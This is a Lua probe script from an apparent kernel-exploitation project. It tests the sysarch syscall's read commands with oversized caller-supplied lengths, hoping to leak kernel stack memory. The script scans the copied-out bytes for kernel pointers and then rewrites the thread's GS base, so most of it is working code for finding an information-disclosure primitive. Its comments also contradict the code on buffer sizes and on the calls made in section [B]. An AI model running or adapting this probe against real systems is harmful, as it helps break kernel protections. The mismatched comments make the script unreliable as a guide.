-- CRASH_CLASS: MODERATE
-- PROBE 1448a: sysarch command family 128-140, untested beyond 129/130
--
-- Context: syscall 166 is sysarch.  Only two commands have ever been measured in this tree:
--   129 AMD64_SET_FSBASE (a zero argument kills userland, so the setter path is live) and
--   130 AMD64_GET_GSBASE (returns 0).  128 AMD64_GET_FSBASE has no capture.  131 AMD64_SET_GSBASE
--   and 132 AMD64_GET_XFPUSTATE have never been called at all.
--
--   AMD64_GET_XFPUSTATE is interesting because it is the only sysarch command that COPIES OUT:
--   FreeBSD's handler does a copyout of the thread's saved FXSAVE/XSAVE area to a caller pointer, and
--   the amount copied is governed by the caller's length argument.  If 14.10 sizes that copy from the
--   caller instead of from a fixed constant, the copy runs off the thread's save area into adjacent
--   kernel stack - a kernel memory disclosure, which is the wall this project has never crossed.
--   The natural guard is "len must equal sizeof(xsave)" or a clamp; a port that lost it hands out
--   whatever follows the fp save area.
--
-- -- prior art: sysarch 129/130 in docs/ATTACK_SURFACE.md and CLAUDE.md ("129 is SET_FSBASE,
--   calling with 0 crashes userland; real GET_GSBASE is 130"); no probe file in the tree calls 166
--   with any other command (grep for make_syscall(166) finds only the 129/130 shape).
--
-- Discriminator: [B] fills a 0x2000 buffer with 0xCC, asks for a SHORT copy at +0x1000 and for a LONG
--   copy at +0x0000, and reports (a) how many bytes each call wrote, (b) the first sixteen dwords,
--   (c) every dword that looks like a kernel or module pointer.  A copy that writes exactly the
--   requested length proves the length is caller-governed; a fixed-length answer with EINVAL for the
--   wrong length proves the guard is present.  Bytes past what the fp area can hold are the leak.

print("=== PROBE 1448a: SYSARCH COMMANDS ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local SYSARCH = make_syscall(166)
local GETPID  = make_syscall(20)
local MAP     = make_syscall(477)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sgn(rv)
    local n = to_num(rv)
    if n < 0 then return -1 end
    return n
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wd(a, v)
    return (pcall(function() memory.write_dword(a, uint64(v)) end))
end
local function wq(a, v)
    return (pcall(function() memory.write_qword(a, uint64(v)) end))
end
local function hex(n) return string.format("0x%08X", n) end

local function map(len, prot, flags, fd, off)
    local ok, va = pcall(function()
        return MAP(uint64(0), uint64(len), uint64(prot or 3),
                   uint64(flags or 0x1002), uint64(fd or 0xFFFFFFFF), uint64(off or 0))
    end)
    if not ok then return -1 end
    local n = to_num(va)
    if n < 0x10000 or n > 0x8000000000 then return -1 end
    return n
end

local pid = sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("canary getpid=%d", pid))
print("")

local p = map(0x8000, 3)
if p < 0 then print("mmap failed -- aborting"); return end
local ARGS = p + 0x0000        -- { void *addr; size_t len; }
local BUF  = p + 0x1000

local SENT = 0xCCCCCCCC

local function wipe(base, len)
    local i = 0
    while i < len do
        wd(base + i, SENT)
        i = i + 4
    end
end

-- how many dwords in [base, base+len) stopped being the sentinel, and the first such offset
local function changed(base, len)
    local n, first = 0, -1
    local i = 0
    while i < len do
        local v = rd(base + i)
        if v ~= SENT and v ~= -1 then
            n = n + 1
            if first < 0 then first = i end
        end
        i = i + 4
    end
    return n, first
end

local function kptrs(base, len)
    local out, n = {}, 0
    local i = 0
    while i < len do
        local v = rd(base + i)
        if v ~= SENT and v ~= -1 then
            local hi = math.floor(v / 4294967296)
            if hi >= 0xFFFF8000 or (hi == 0xFFFF and v > 0xFFFF0000) then
                n = n + 1
                if n <= 8 then out[#out + 1] = string.format("+%03X=%s", i, hex(v)) end
            end
        end
        i = i + 4
    end
    return n, table.concat(out, " ")
end

local function dump(base, n)
    local parts = {}
    local i = 0
    while i < n do
        parts[#parts + 1] = hex(rd(base + i))
        i = i + 4
    end
    return table.concat(parts, " ")
end

--------------------------------------------------------------------------
-- [A] reads: 128 GET_FSBASE, 130 GET_GSBASE, 132 GET_XFPUSTATE
--     each is given a {addr,len} struct; the addr points at a wiped buffer.
--------------------------------------------------------------------------
print("[A] read-shaped commands, length argument sweep")
local cmds = {128, 130, 132}
local lens = {0, 0x40, 0x100, 0x200, 0x400, 0x1000}
local ci = 1
while ci <= #cmds do
    local cmd = cmds[ci]
    local li = 1
    while li <= #lens do
        local len = lens[li]
        wipe(BUF, 0x1000)
        wq(ARGS, BUF)
        wq(ARGS + 8, len)
        local rv = sgn(SYSARCH(uint64(cmd), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
        local n, first = changed(BUF, 0x1000)
        local nk, klist = kptrs(BUF, 0x1000)
        print(string.format("  sysarch(%d, len=%s) rv=%-4s %-14s wrote %d dwords first=+%03X kptr=%d",
            cmd, hex(len), tostring(rv), es(), n, first, nk))
        if n > 0 then
            print(string.format("      head: %s", dump(BUF, 0x40)))
            if nk > 0 then print(string.format("      kptrs: %s", klist)) end
        end
        li = li + 1
    end
    ci = ci + 1
end
print("")

--------------------------------------------------------------------------
-- [B] oversize: 0x2000 requested against a 0x2000 buffer, then 0x8000 against
--     the same 0x2000 buffer (the tail of the request runs past the mapping,
--     so EFAULT is the safe answer and a partial write is a leak).
--------------------------------------------------------------------------
print("[B] oversize length requests on 132")
wipe(BUF, 0x1000)
wq(ARGS, BUF)
wq(ARGS + 8, 0x4000)
local rvO = sgn(SYSARCH(uint64(132), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
local nO, fO = changed(BUF, 0x1000)
local nkO, kO = kptrs(BUF, 0x1000)
print(string.format("  sysarch(132, len=0x4000) rv=%-4s %-14s wrote %d dwords first=+%03X kptr=%d",
    tostring(rvO), es(), nO, fO, nkO))
print(string.format("      head: %s", dump(BUF, 0x40)))
if nkO > 0 then print(string.format("      kptrs: %s", kO)) end
print("")

--------------------------------------------------------------------------
-- [C] unknown commands 133..140 with the same {addr,len} shape
--------------------------------------------------------------------------
print("[C] unknown commands 133-140 (same {addr,len} struct, len=0x100)")
local c = 133
while c <= 140 do
    wipe(BUF, 0x1000)
    wq(ARGS, BUF)
    wq(ARGS + 8, 0x100)
    local rv = sgn(SYSARCH(uint64(c), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
    local n, first = changed(BUF, 0x400)
    print(string.format("  sysarch(%d) rv=%-4s %-14s wrote %d dwords first=+%03X head: %s",
        c, tostring(rv), es(), n, first, dump(BUF, 0x10)))
    c = c + 1
end
print("")

--------------------------------------------------------------------------
-- [D] 131 SET_GSBASE last: it changes this thread's %gs base, so it runs after
--     every measurement that needs errno to behave.
--------------------------------------------------------------------------
print("[D] 131 SET_GSBASE to a mapped page, then read it back with 130")
wq(ARGS, BUF)
local rvS = sgn(SYSARCH(uint64(131), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  sysarch(131, buf) rv=%-4s %s", tostring(rvS), es()))
wq(ARGS, 0)
wq(ARGS + 8, 0)
local rvG = sgn(SYSARCH(uint64(130), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  sysarch(130) rv=%-4s %-14s arg=%s", tostring(rvG), es(), hex(rd(ARGS))))
print("")

print(string.format("[E] survivor pid=%d (was %d)", sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), pid))
print("")
print("=== PROBE 1448a COMPLETE ===")
